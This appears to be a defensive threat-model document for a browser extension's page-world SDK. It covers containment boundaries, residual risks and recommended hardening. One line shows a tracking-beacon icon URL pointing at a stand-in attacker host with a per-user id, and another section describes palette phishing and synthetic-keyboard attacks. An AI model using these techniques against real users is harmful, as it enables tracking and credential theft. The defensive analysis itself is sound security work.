# Site SDK Security Model

Threat model for the page-world `window.Monocle` SDK and the content overlay it
feeds. Read `docs/site-sdk.md` first for how the SDK works; this file covers what
an untrusted page can and cannot do, why, and the residual risks worth tracking.

The SDK is a runtime command source, not a permissioned plugin system. Its
defining property: **site callbacks run in the page, and SDK commands never gain
extension privilege**. This document explains the boundaries that make that true
and the risks that survive them.

## Attacker model

The trust levels differ sharply by actor:

| Actor | Reach | Trust |
| --- | --- | --- |
| Untrusted web page (page/MAIN world JS) | `window.Monocle` + `window.postMessage` to the bridge | Hostile. The main subject of this doc. |
| Another installed extension | `runtime.sendMessage` with its own `sender.id` | Hostile; blocked by sender check. |
| The extension's own content script (isolated world) | Privileged background messages | Trusted; compromise is out of scope but informs defense-in-depth. |
| The extension UI (palette, new-tab) | Privileged background messages | Trusted. |

Unless stated otherwise, "a site can…" means page/MAIN-world JavaScript, the
hostile case.

## Why the SDK is contained

Three structural facts bound what a hostile page can reach. All three are load
bearing; the design depends on all of them holding.

### 1. A web page cannot reach the background directly

`externally_connectable` is not set (`wxt.config.ts`), so a page's
`chrome.runtime.sendMessage(extensionId, …)` is never delivered to the
background. The sender validation inside
`createCrossBrowserMessageHandler` (`background/utils/runtime.ts`) also
rejects any message whose `sender.id` belongs to a different extension, and
rejects `data:` / `javascript:` / `about:blank` senders.

The only page-to-extension channel that exists is `window.postMessage` into the
isolated content bridge.

### 2. The page-to-bridge channel is narrow

The bridge's `handlePageMessage` (`content/siteSdkBridge.ts`) accepts exactly
two message shapes from the page, both source-tagged `monocle-site-sdk`:

- `sync` — a full registration snapshot.
- `invoke-response` — the page answering one of its own pending callbacks.

The bridge does **not** relay arbitrary messages. A page cannot use it to emit
`monocle-command-execute`, `monocle-commands-search`, `monocle-workflow-execute`, `monocle-permission-request`,
or any other privileged message. There is no "page drives the facade, which
relays to the bridge, which reaches a privileged handler" path: no such relay
exists.

The source markers are routing filters, not authentication. Any script running
in the page can see and send same-window `postMessage` traffic with those marker
strings. That is acceptable only because the channel carries site-owned SDK
data and callback answers, never native command results or browser privileges.

### 3. SDK command execution never touches a privileged API

The crux of containment. When a user runs a site command, the generated
background wrapper's `execute` (the `convertCommand` closures in
`background/commands/siteSdk/commands.ts`) does exactly one thing:
`invokeSiteSdk` sends a message back to the page so the page's own stored
callback runs in the page's own JS world. No SDK code path calls
`chrome.bookmarks`, `chrome.history`, `chrome.tabs`, `chrome.cookies`, or any
other privileged API.

A site callback can therefore only do what page JavaScript can already do.
**Privilege gain is zero.** SDK wrappers also strip `permissions`,
`supportedBrowsers`, and default keybindings, and force
`allowCustomKeybinding: false`.

### Validation boundary

Everything crossing page → background is a function-free, Zod-validated
declaration (`shared/types/siteSdk.ts`): strict objects (unknown fields
rejected), reserved-id protection, depth/count caps, and protocol allow-listing
(icon URLs and URL-rule patterns limited to `http`/`https`).
Callback-returned commands are validated a second time
(`validateCallbackCommands` in `background/commands/siteSdk/commands.ts`).
Subframes cannot register: `allFrames: false` on the facade plus a
`frameId !== 0` rejection in `createSiteSdkScopeFromSender`
(`background/commands/siteSdk/scope.ts`) keep a hostile iframe (e.g. an ad)
from injecting commands into the top page's palette.

The headline fear — *site → facade → `tabs` / `bookmarks` / `history`* — has no
path.

## What is genuinely protected

| Protection | Where | Effect |
| --- | --- | --- |
| No direct page→background channel | `externally_connectable` unset; `createCrossBrowserMessageHandler` (`background/utils/runtime.ts`) | Page cannot message the background except through the bridge. |
| Narrow bridge protocol | `handlePageMessage` (`content/siteSdkBridge.ts`) | Only `sync` / `invoke-response` accepted; no privileged relay. |
| No privileged sink in SDK execution | `convertCommand` (`background/commands/siteSdk/commands.ts`) | Site commands round-trip to page callbacks only. |
| Closed shadow DOM, isolated world | `defineContentScript` `main` (`entrypoints/content.tsx`, `createShadowRootUi` `mode: "closed"`) | Bookmark/history/tab data lives in the isolated heap; page JS cannot read the palette DOM via `.shadowRoot`. |
| Bridge never posts native data to the page | `postBridgeMessage` (`content/siteSdkBridge.ts`) | The bridge posts only the page's own SDK data back; no suggestion data crosses to MAIN world. |
| Subframe registration blocked | `createSiteSdkScopeFromSender` (`background/commands/siteSdk/scope.ts`) | Iframes cannot inject into the top page's palette. |
| Function-free, double-validated declarations | `shared/types/siteSdk.ts` | Strict schema, reserved ids, depth/count caps, protocol allow-list. |
| Strong extension-pages CSP | `wxt.config.ts` | `script-src 'self'`, `object-src 'none'`, scoped `connect-src`; dev relaxations gated to `serve`. |
| SVG icons rendered as static data-URI `<img>` | `Icon` / `UrlImageIcon` (`shared/components/Icon.tsx`) | Script/handler injection in SVG markup neutralized. |

## Tier 1 — risks a hostile website can exercise today

None of these lets a site read browsing data. Each is a real, page-reachable
behavior against the *trusted UI surface* rather than against privileged APIs.

### 1.1 Synthetic keyboard events may trigger Monocle keybindings (medium)

The content script installs capture-phase keydown listeners for the palette
toggle and global keybindings (`shared/hooks/useCommandPaletteStateRedux.tsx`,
`shared/utils/robust-key-capture.ts`). Those listeners do not currently require
`event.isTrusted`. A hostile page can likely dispatch synthetic `KeyboardEvent`s
that look like registered Monocle shortcuts and cause the content script to send
`monocle-keybinding-execute`.

The blast radius is constrained:

- Permissioned commands still hit the background execution-time permission check
  (`executeResolvedCommand` in `background/commands/execution.ts`).
- `confirmAction` commands are excluded from the keybinding registry by
  `allowsKeybinding`, so high-risk close-tab/window defaults are not reachable
  through keybindings.
- SDK commands force `allowCustomKeybinding: false`, so a site cannot register
  its own executable shortcut.

But this is still a real confused-deputy edge. A page can potentially trigger
non-permissioned browser actions (`open-new-tab`, `open-new-window`,
`open-private-window`, reload, back/forward) or any user-configured keybinding
whose command is visible and already permission-granted. Key handlers should
ignore untrusted events before resolving or executing shortcuts.

### 1.2 Extension fingerprinting via `window.Monocle` (privacy, medium)

The MAIN-world facade is injected into every page at `document_start` and
unconditionally sets `window.Monocle`
(`entrypoints/site-sdk.content.ts`, `installMonocleSiteSdk` in
`content/siteSdkFacade.ts`). Any
site can run `if (window.Monocle?.commands?.register)` and reliably detect a
Monocle user, enabling fingerprinting and targeted behavior. There is no
per-site gating or opt-out. This is inherent to a page-world SDK, but
`<all_urls>` + `document_start` maximizes exposure.

### 1.3 Site icon URLs as a tracking beacon (privacy, low)

A site can register a command with
`icon: { type: "url", url: "https://attacker.example/px.png?u=<id>" }`. The
palette renders it as a literal `<img src={icon.url}>` (the `icon.type === "url"`
branch of `Icon` in `shared/components/Icon.tsx` routes to `UrlImageIcon`), so
the URL is fetched from the user's browser when the palette opens and that row is
visible. The site learns: the palette was opened on their page, a unique per-user
id, and the user's IP/timestamp. The schema forbids `data:` icons, so every URL
icon is a network fetch.

Severity is low — the site already knows the user is present; the marginal
signal is "uses Monocle and just opened it," and it cannot read anything. But it
is a real beacon and compounds 1.2.

### 1.4 Trusted-UI injection / in-palette phishing (low/medium)

The command palette is trusted chrome; users read it as "the extension," not
"the website." The SDK lets a site inject rows into it:

- `placement: "root"` commands appear in the root list alongside native
  suggestions (`createSiteSdkRootCommands` in
  `background/commands/siteSdk/commands.ts`), not only
  under the host-labeled site group. A deceptively named row with a
  native-looking icon blends in.
- `input` / `submit` fields render forms inside the palette; entered `values`
  are delivered straight to the site callback (the `convertCommand` submit
  branch in `background/commands/siteSdk/commands.ts`). A user may type a secret
  into the trusted overlay that they would never type into the page's own DOM.

The damage ceiling is "user is tricked into giving the site input, or running
page code, via a trusted-looking surface" — the site still cannot reach native
privileged commands. But trusted-surface spoofing is a legitimate phishing
primitive.

### 1.5 Palette spam / search-index thrash (availability, low)

Every `register` / `update` / `dispose` triggers a full `postSync`
(the `postSync` helper installed by `installMonocleSiteSdk` in
`content/siteSdkFacade.ts`), and every sync calls `invalidateSearchIndex()`
(`handleSiteSdkSync` in `background/messages/siteSdkSync.ts`). A page can
loop `handle.update(...)` to force repeated index invalidation. The
1000/min/sender rate limiter caps it and registrations are bounded
(20 × 100, depth 5), so it is an annoyance rather than a crash.

### 1.6 Native favicon lookup can leak privileged domains (privacy, medium)

Adjacent to the SDK rather than caused by it, but it lives in the same palette
rendering path and is a stronger privacy issue than site icon beacons.
Bookmark and history commands resolve favicons through DuckDuckGo's icon service
(`getDuckDuckGoFaviconUrl`, reached via `getFaviconUrl`, in
`background/utils/favicon.ts`), and those commands are built from
privileged browser data after the user grants `bookmarks` or `history`
permissions (`processBookmarkNode` in
`background/commands/browser/bookmarks.ts`, `createHistoryItemCommand` in
`background/commands/browser/history.ts`).

When those rows render, the browser can request:

```text
https://icons.duckduckgo.com/ip3/<domain>.ico
```

That can disclose domains from bookmarks or browsing history to DuckDuckGo. It
does not disclose full URLs, and it requires the user to have granted the
underlying permission and opened/search-rendered the relevant rows. Still, the
data source is privileged browser state, so this is materially more sensitive
than an SDK site learning that its own icon rendered.

## Tier 2 — latent weaknesses not reachable by a website today

**A hostile website cannot reach any of these** — they require privileged
runtime messages that only the extension's own isolated-world UI can send (see
"Why the SDK is contained," points 1–2). They are recorded as defense-in-depth:
they matter if the isolated content world is ever compromised (e.g. a
dependency supply-chain issue) or if the SDK/bridge surface grows to relay more.

| # | Weakness | Where | Note |
| --- | --- | --- | --- |
| 2.1 | `context.url` is client-supplied and trusted for URL-rule filtering | `handleSearchCommands` (`background/messages/searchCommands.ts`, calling `getVisibleEntries(index, context.url)`) | URL filtering is an advisory visibility layer, not a security boundary, for whoever controls the message. The SDK *sync* path is not affected — the bridge stamps `context` from its own `window.location.href` (`createContext` in `content/siteSdkBridge.ts`), so SDK origin-scoping is not page-spoofable. |
| 2.2 | `executeCommand` runs any command id with no gate beyond the permission check | `executeCommand` (`background/messages/executeCommand.ts`); permission check in `executeResolvedCommand` (`background/commands/execution.ts`) | No user-gesture check, no per-sender allow-list; the optional-permission grant is the sole defense. |
| 2.3 | `searchCommands` does not clamp `limit` | `handleSearchCommands` (`background/messages/searchCommands.ts`, where `message.limit` is read and applied via `ranked.slice(0, limit)`) | A caller can request the whole ranked index in one call — a bulk interface over permission-gated dynamic commands. |
| 2.4 | Background-to-content SDK invokes target only `tabId`, not `documentId` / `frameId` | `invokeSiteSdk` (`background/commands/siteSdk/commands.ts`, `sendTabMessage(scope.tabId, …)`) | Registry ownership is scoped by tab/document/origin, but invoke delivery is tab-wide. Around navigation or service-worker resync races, a message intended for one document can be delivered to the current document in the same tab. The callback id normally fails closed, but document-targeted messaging would match the registry model. |
| 2.5 | `executeWorkflow` trusts caller-supplied `tabId` over the sender's tab | `resolveWorkflowTargetTabId` (`background/workflows/execution.ts`) | Cross-tab targeting by design. The full content vocabulary is now implemented (all 17 ops in `content/workflow/executor.ts`), so this *is* a general action-injection surface — fill/type/key/click/submit/etc. on an arbitrary tab — not the narrow `click`/`wait` it once was. |
| 2.6 | Workflow messages are sent only by `tabId`, not document/frame | `executeWorkflowOnTargetTab` (`background/workflows/execution.ts`) | Same targeting shape as SDK invokes. A navigation race can send DOM automation to the wrong document in a reused tab. |
| 2.7 | Content-side workflow listener validates nothing | `handleBackgroundMessage` in `useCommandPaletteStateRedux` (`shared/hooks/useCommandPaletteStateRedux.tsx`) | `_sender` unused; `message.workflow` cast without re-validation. Not page-reachable (pages cannot post to a content script's `runtime.onMessage`), but asymmetric with the background's rigorous sender checks. |
| 2.8 | Workflow clicks have no occlusion guard | `executeClick` (`content/workflow/interactionOps.ts`); `isElementVisible` (`content/workflow/dom.ts`) | `isElementVisible` checks geometry/`display`/`visibility` only, then `executeClick` calls `element.click()`. Clickjacking-by-proxy if a workflow runs on a hostile page. |
| 2.9 | `requestPermission` / `openPermissionGrantPage` not restricted to extension-page senders | `background/messages/requestPermission.ts`, `background/messages/openPermissionGrantPage.ts` | Legitimate grant flows originate from the new-tab/options UI; prompt-fatigue vector if the isolated world is compromised. |

## Search privacy boundary

Root command search stays background-owned. A site's SDK search callback receives
the query string only after the user opens that site's own `search` command page
(the `search` branch of `convertCommand` in
`background/commands/siteSdk/commands.ts`, whose `getResults` invokes the page).
Typing into the global root
palette search does not stream arbitrary query text to every site command.

There is one weaker observation channel: root search/index building can resolve
SDK group children when a site group participates in deep search
(`walkGroups` in `background/commands/searchIndex.ts`). That lets a page infer that
Monocle is loading or rebuilding command search entries, but not what the user
typed into the root search box.

## Recommended priorities

1. **Badge SDK rows as site-provided everywhere, including `placement: "root"`**
   (or drop root placement for SDK commands). Cheapest fix for the
   highest-judgment risk (1.4).
2. **Require trusted user events for keyboard-driven privileged paths (1.1).**
   Palette toggles and global keybinding execution should ignore synthetic DOM
   events before resolving shortcuts.
3. **Decide and document the fingerprinting trade-off (1.2).** Ideally gate
   `window.Monocle` injection behind a setting or per-origin opt-in; the SDK is
   session-only and niche, so most users do not need it live on every site.
4. **Neutralize remote icon privacy leaks.** For SDK icons (1.3), restrict URL
   icons to the registering origin or at least render them with
   `referrerPolicy="no-referrer"`; do not add a generic page-controlled proxy.
   For native bookmark/history favicons (1.6), prefer browser/local favicon APIs
   or generic icons over third-party favicon lookups.
5. **Target page-bound messages by document/frame where supported.** SDK invokes
   and workflow messages should match the sender-derived tab/document/frame
   scope, and should ideally re-check current origin before invoking page
   callbacks or DOM automation.
6. **Harden the message layer for the future** (Tier 2): clamp
   `searchCommands.limit`; derive URL-filtering and workflow `tabId` from
   `sender` rather than message contents where cross-tab control is not
   intentional; add a content-side workflow `sender.id` check plus schema
   re-validation; restrict permission-request handlers to extension-page
   senders.

The residual risks are about the palette being a trusted UI surface that now
renders site-controlled content — phishing, fingerprinting, synthetic input
confusion, and remote-resource privacy leaks — not about direct privilege
escalation into browsing data. The containment on the escalation axis holds.

## Invariants to preserve

When changing SDK, bridge, or message code, do not regress these:

- Keep `externally_connectable` unset.
- Keep the bridge protocol limited to `sync` / `invoke-response`; never relay
  arbitrary privileged messages from the page.
- Treat `postMessage` source markers as non-secret routing hints; never put
  native data or privileged results on the page channel.
- Keep SDK command executors round-tripping to page callbacks only — never wire
  an SDK command to a privileged browser API.
- Keep SDK origin/scope derived from the sender and the bridge's own
  `window.location`, never from page-supplied `context` for ownership.
- Prefer document/frame-targeted background-to-content messages for scoped
  page work.
- Ignore untrusted synthetic DOM events in privileged keyboard paths.
- Keep the content overlay in a closed shadow root and the isolated world.
- Keep declaration validation function-free and double-validated for
  callback-returned commands.
